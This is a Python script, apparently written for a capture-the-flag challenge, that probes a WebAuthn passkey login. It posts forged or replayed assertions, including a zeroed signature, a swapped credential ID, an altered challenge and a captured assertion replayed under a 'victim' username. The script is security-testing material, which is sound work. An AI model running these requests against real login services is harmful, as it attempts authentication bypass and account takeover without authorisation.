#!/usr/bin/env python3
"""
webauthn_tester.py

Usage:
  1) Prepare a JSON file (captured assertion) with these keys:
     {
       "url": "https://passkey.chals.tisc25.ctf.sg/login",
       "username": "testuser",
       "credential_id": "<base64url>",
       "authenticator_data": "<base64url>",
       "client_data_json": "<base64url>",
       "signature": "<base64url>"
     }

  2) Run one test at a time (see examples below).

This script requires: requests
pip install requests
"""

import argparse, sys, json, base64, copy
import requests
from urllib.parse import urljoin

def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64u_decode(s: str) -> bytes:
    s = s + "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)

def zeros_b64u(length=32) -> str:
    return b64u_encode(b"\x00" * length)

def load_capture(path):
    with open(path, "r") as f:
        return json.load(f)

def post_form(url, data, show_response=True):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = requests.post(url, data=data, headers=headers, allow_redirects=True, timeout=15)
    except Exception as e:
        print("[!] Request failed:", e)
        return None
    if show_response:
        print("=== HTTP RESPONSE ===")
        print("Status:", r.status_code)
        print("URL:", r.url)
        print("Headers:")
        for k,v in r.headers.items():
            print(f"  {k}: {v}")
        print("\nBody (first 2000 chars):")
        print(r.text[:2000])
        print("=====================")
    return r

def test_invalid_signature(capture):
    print("[*] Test: invalid_signature — replace signature with 32 zero bytes (base64url)")
    payload = {
        "username": capture["username"],
        "credential_id": capture["credential_id"],
        "authenticator_data": capture["authenticator_data"],
        "client_data_json": capture["client_data_json"],
        "signature": zeros_b64u(32)
    }
    return post_form(capture["url"], payload)

def test_replay_as_other_username(capture, victim_username):
    print(f"[*] Test: replay_as_other_username — replay assertion but use username={victim_username}")
    payload = {
        "username": victim_username,
        "credential_id": capture["credential_id"],
        "authenticator_data": capture["authenticator_data"],
        "client_data_json": capture["client_data_json"],
        "signature": capture["signature"]
    }
    return post_form(capture["url"], payload)

def test_swap_credential_id(capture, new_cred_id):
    print(f"[*] Test: swap_credential_id — use credential_id={new_cred_id} but keep assertion fields from captured credential")
    payload = {
        "username": capture["username"],
        "credential_id": new_cred_id,
        "authenticator_data": capture["authenticator_data"],
        "client_data_json": capture["client_data_json"],
        "signature": capture["signature"]
    }
    return post_form(capture["url"], payload)

def test_modify_client_challenge(capture):
    print("[*] Test: modify_client_challenge — change clientDataJSON.challenge to a different string")
    # decode client_data_json, modify challenge, re-encode
    cd_b = b64u_decode(capture["client_data_json"])
    try:
        cd = json.loads(cd_b.decode())
    except Exception as e:
        print("[!] Failed to parse client_data_json as JSON:", e)
        return None
    old_ch = cd.get("challenge")
    cd["challenge"] = (old_ch or "") + "_MOD"
    new_cd_b64 = b64u_encode(json.dumps(cd).encode())
    payload = {
        "username": capture["username"],
        "credential_id": capture["credential_id"],
        "authenticator_data": capture["authenticator_data"],
        "client_data_json": new_cd_b64,
        "signature": capture["signature"]
    }
    print("[*] Original challenge:", old_ch)
    print("[*] New challenge:", cd["challenge"])
    return post_form(capture["url"], payload)

def test_replay_twice(capture):
    print("[*] Test: replay_twice — POST the same assertion twice in a row (check for signCount enforcement)")
    payload = {
        "username": capture["username"],
        "credential_id": capture["credential_id"],
        "authenticator_data": capture["authenticator_data"],
        "client_data_json": capture["client_data_json"],
        "signature": capture["signature"]
    }
    print("[*] First POST:")
    r1 = post_form(capture["url"], payload)
    print("\n[*] Second POST (same payload):")
    r2 = post_form(capture["url"], payload)
    return (r1, r2)

def main():
    ap = argparse.ArgumentParser(description="WebAuthn single-test tool (one exploit/test at a time).")
    ap.add_argument("--capture", required=True, help="path to JSON file with captured POST fields (see script header)")
    ap.add_argument("--test", required=True, choices=["invalid_signature","replay_other_user","swap_credential_id","modify_challenge","replay_twice"], help="which single test to run")
    ap.add_argument("--victim", help="victim username for replay_other_user")
    ap.add_argument("--newcred", help="new credential_id (base64url) for swap_credential_id")
    args = ap.parse_args()

    capture = load_capture(args.capture)

    if args.test == "invalid_signature":
        test_invalid_signature(capture)
    elif args.test == "replay_other_user":
        if not args.victim:
            print("[!] replay_other_user requires --victim <username>")
            sys.exit(1)
        test_replay_as_other_username(capture, args.victim)
    elif args.test == "swap_credential_id":
        if not args.newcred:
            print("[!] swap_credential_id requires --newcred <base64url_credential_id>")
            sys.exit(1)
        test_swap_credential_id(capture, args.newcred)
    elif args.test == "modify_challenge":
        test_modify_client_challenge(capture)
    elif args.test == "replay_twice":
        test_replay_twice(capture)
    else:
        print("[!] unknown test")

if __name__ == "__main__":
    main()
